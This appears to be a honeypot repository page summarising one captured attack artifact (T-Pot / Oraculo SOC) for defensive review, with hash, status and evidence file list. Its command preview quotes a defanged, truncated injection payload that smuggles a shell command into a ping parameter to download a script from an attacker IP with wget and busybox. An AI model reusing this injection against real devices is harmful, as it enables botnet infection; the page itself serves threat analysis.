# 062fca95fa202838027d13b0a88e06755701ad95a289ace59e4477752d3999f2

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `062fca95fa202838027d13b0a88e06755701ad95a289ace59e4477752d3999f2` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
act=ping&dst=%26%20cd%20/tmp%3Brm%20-f%20.s%3Bwget%20hxxp://91[.]92[.]40[.]XXX/wget.sh%20-O%20.s%3Bbusybox%20wget%20hxxp://91.
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
